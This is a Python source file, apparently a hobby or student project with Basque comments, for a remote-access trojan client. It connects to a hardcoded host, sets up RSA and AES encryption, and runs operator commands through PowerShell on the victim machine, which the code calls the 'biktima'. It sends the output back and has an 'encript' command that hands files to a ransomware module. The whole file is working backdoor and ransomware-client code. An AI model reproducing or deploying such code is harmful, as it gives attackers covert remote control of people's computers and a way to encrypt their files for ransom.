import socket 
import time
import zlib
import pickle
import win32api
import os
import subprocess
import json
import binascii
import asyncio
import time
from fitxategiak.fitxa import bialketa
from fitxategiak.asimetric import asime
from fitxategiak.aesencrypt import aesenc
from fitxategiak.ranson import ransow




class bezeroa(object):
    def __init__(self,ip_biktima,portua):
        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.so.connect((ip_biktima,portua))
            self.GPG = asime(".")
            self.ranso = ransow() 
            self.GPG.Generastekey("cliente")
            self.encriAes = None
            self.decriptAes = None
        except (ConnectionRefusedError):
           print("none server")


    
    def postPuKey(self):
        url = os.getcwd()
        filBT = None
        with open('pUcliente.pem', "rb") as key_file:
           filBT = key_file.read()
        self.so.send(filBT)
    
    def getPuKey(self):
        keyP =  self.so.recv(1024)
        clientKey = open(f'pUserver.pem','w')
        for x in keyP.splitlines():
            clientKey.write(f'{str(x,"utf-8")}\n')
    
    def keysLoad(self):
        self.GPG.loadPublic("pUserver.pem")
        os.chdir("../prybate")
        self.GPG.loadPrymari("prybate.pem")
        os.chdir("../../")
        self.GPG.delete()
       
   
     
    def Aeskeyload(self):
        key = binascii.hexlify(os.urandom(32))
        iv = binascii.hexlify(os.urandom(16))
        decriAes = {}
        decriAes["key"] = str(key,encoding='utf-8')
        decriAes["iv"] = str(iv,encoding='utf-8')
        strDecriAes = json.dumps(decriAes)
        bytDecriAes = bytes(strDecriAes,encoding='utf-8')
        self.decriptAes = aesenc(binascii.unhexlify(bytes(decriAes["key"],encoding='utf-8')),binascii.unhexlify(bytes(decriAes["iv"],encoding='utf-8')))
        EncdecriAes = self.GPG.encrypted(bytDecriAes)
        self.so.send(EncdecriAes)
        EnencriAes = self.so.recv(1024)
        DeencriAes = str(self.GPG.decrypt(EnencriAes),encoding='utf-8')
        encriAes = json.loads(DeencriAes)
        self.encriAes = aesenc(binascii.unhexlify(bytes(encriAes['key'],encoding='utf-8')),binascii.unhexlify(bytes(encriAes['iv'],encoding='utf-8')))
        
    
    def buffLengP(self,data):
         leng = len(data)
         Slen = str(leng)
         Blen = bytes(Slen,encoding='utf-8')
         self.so.send(self.encriAes.encript(Blen))
         self.so.recv(1024)


    def comandLIne(self):
        user = os.getlogin()#win32api.GetUserName()
        url = os.getcwd()#ruta aktuala 
        ruter = bytes(user+"@"+url,encoding='utf-8') 
        ruterENC = self.encriAes.encript(ruter)
        self.buffLengP(ruterENC)
        self.so.send(ruterENC)
        comand = self.so.recv(2024)
        comandDEC = str(self.decriptAes.decript(comand),encoding='utf-8')
        return comandDEC

    
    def cmdGlobal(self,cmd,sistem):
        if sistem == "nt":
                """""
                result = subprocess.run(["powershell", "-Command",cmd], capture_output=True,shell=True,text=True)
                if result.stdout:
                    enResult = self.encriAes.encript(bytes(result.stdout,encoding='utf-8'))
                    self.buffLengP(enResult)
                    self.so.send(enResult)
                if result.stderr:
                    enResult = self.encriAes.encript(bytes(result.stderr,encoding='utf-8'))
                    self.buffLengP(enResult)
                    self.so.send(enResult)
                """
                    
                
                try:
                    result = subprocess.Popen(['powershell','-NonInteractive','-Command',cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True, text=True)
                    #time.sleep(0.5)
                    #result.terminate()                
                    stdout , stderr = result.communicate()
                    if stderr:
                        enResult = self.encriAes.encript(bytes(stderr,encoding='utf-8'))
                        self.buffLengP(enResult)
                        self.so.send(enResult) 
                    if stdout:
                        enResult = self.encriAes.encript(bytes(stdout,encoding='utf-8'))
                        self.buffLengP(enResult)
                        self.so.send(enResult) 
                    elif  len(stdout) == 0 and len(stderr) == 0:
                        enResult = self.encriAes.encript(bytes('ok',encoding='utf-8'))
                        self.buffLengP(enResult)
                        self.so.send(enResult) 
                except:
                  enResult = self.encriAes.encript(bytes('error',encoding='utf-8'))
                  self.buffLengP(enResult)
                  self.so.send(enResult) 


    def rutasCD(self,ruta):
        try:
         os.chdir(ruta)
        except:
          None

    def encripTf(self,ruta):
        print("encript")
        ar = ruta[1:]
        arn = " ".join(ar)
        print(arn)
        if arn != "pc":
            revKeyen = self.so.recv(1024)
            revkey = str(self.decriptAes.decript(revKeyen),encoding='utf-8')
            res = self.ranso.encriptFile(revkey,arn)
            self.so.send(self.encriAes.encript(bytes(res,encoding='utf-8')))

    def koneksioa(self):
        while True:
            recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
            url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
            while True:
                mezua  = input(url + ">")#ruta actuala erantzukizun belezela jarriko du gure erantzuna jaso harte
                if len(mezua) != 0 and mezua.split(" ")[0] != "python":
                    break
            self.so.send(bytes(mezua,encoding = 'utf-8'))# guk idatzitako mezua bidaliko du 
            if mezua == "itxi": # buklea mozteko 
                break
            #funtzioak
            comand = mezua.split(" ")#honen bitartez gure mezua zatitzen dugu espazioaren bitartez
            if comand[0].lower() == "cd" and len(comand) > 1:#lenego zatia cd baldinbada eta bere lusehera 1 baina handiagoa
                erantzuna =  self.so.recv(4095)#cd bidalitako erantzuna jasoko du
            elif comand[0] != "local":
              luz = self.so.recv(4095)#datuaren luzhera jasoko du 
              self.so.send(bytes("ok",encoding = 'utf-8'))#datua ongi iritzidela adirezten diogu
              erantzuna = self.so.recv(int(luz))#erantzuna jasotzen dugu
              print(str(erantzuna,encoding = 'utf-8')) 
            if comand[0].lower() == "local" and len(comand) > 1 :
              if comand[1].lower() == "all":
                luz_a =  self.so.recv(14095)
                #1
                self.so.send(bytes("ok",encoding = 'utf-8'))
                #2
                fitxategiak_a =  self.so.recv(int(luz_a))
                #3
                self.so.send(bytes("ok",encoding = 'utf-8'))
                #4
                data_arr = pickle.loads(fitxategiak_a)
                print(data_arr[0])
                ruta = "C:\\Users\\web\\Desktop\\nuevoxczx"
                izen_a = data_arr[0]
                fitxa_a = data_arr[1]
                bi = bialketa(izen_a,fitxa_a,ruta,"all") 
                bi.exekutatu()
              erantzuna =  self.so.recv(4095)#5local bidalitako erantzuna jasoko du
              print(str(erantzuna,encoding = 'utf-8'))
              print("adsd")
            #funtzioak
            self.so.send(bytes("ok",encoding = 'utf-8'))# 6 mezua ongi iritxi dela adierazteko
        self.so.close()#koneksioa itxi 




bezeroa = bezeroa("192.168.1.130",9999)
bezeroa.postPuKey()
bezeroa.getPuKey()
bezeroa.keysLoad()
bezeroa.Aeskeyload()

while True:
   comand = bezeroa.comandLIne()
   if len(comand) != 1 or comand == "h":
        comdaExe = comand.split(" ")
        arrComad = []
        for fd in comdaExe:
            if fd != "":
                arrComad.append(fd)
        if arrComad[0] == "cd":
            bezeroa.rutasCD(arrComad[1])
        if arrComad[0] == "encript":
             bezeroa.encripTf(arrComad)
        if arrComad[0] == "exit":
            break
        elif arrComad[0] != "exit" and arrComad[0] != "cd"  and arrComad[0] != "encript":
            bezeroa.cmdGlobal(comand,os.name)
